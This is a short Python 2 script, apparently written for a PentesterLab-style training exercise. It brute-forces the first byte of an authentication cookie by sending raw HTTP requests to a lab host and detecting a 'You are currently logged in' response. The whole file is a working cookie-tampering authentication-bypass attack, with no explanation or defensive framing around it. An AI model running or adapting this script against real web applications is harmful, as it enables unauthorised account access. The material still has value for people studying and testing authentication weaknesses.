#!/usr/bin/python

import urllib
import socket

HOST = 'ptl-3f8d0e40-6022e312.libcurl.so'
PORT = 80
COOKIE = 'XSkZEYaXHI0lb2In79wXobtEQs86tIQ'

b=0x00

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.sendall('GET /index.php HTTP/1.1\r\nHost: '+HOST+'\r\nCookie: auth=Q'+COOKIE+'\r\nConnection: Close\r\n\r\n')
data = s.recv(1024)
while data:
    print data
    data = s.recv(1024)
print data
s.close()

n=0
while (b<0xFF):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall('GET /index.php HTTP/1.1\r\nHost: '+HOST+'\r\nCookie: auth='+urllib.quote(chr(b)) + COOKIE+'\r\nConnection: close\n\r\n')
    loggedIn = False
    data = s.recv(1024)
    while data and not loggedIn:
            if "You are currently logged in" in data:
                loggedIn = True
            data = s.recv(1024)
    if (loggedIn):
        print " ("+chr(b)+"), Logged in"
        print b
    #else:
    #    print " ("+chr(b)+"), not logged in"
    b = b + 0x01
    s.close()
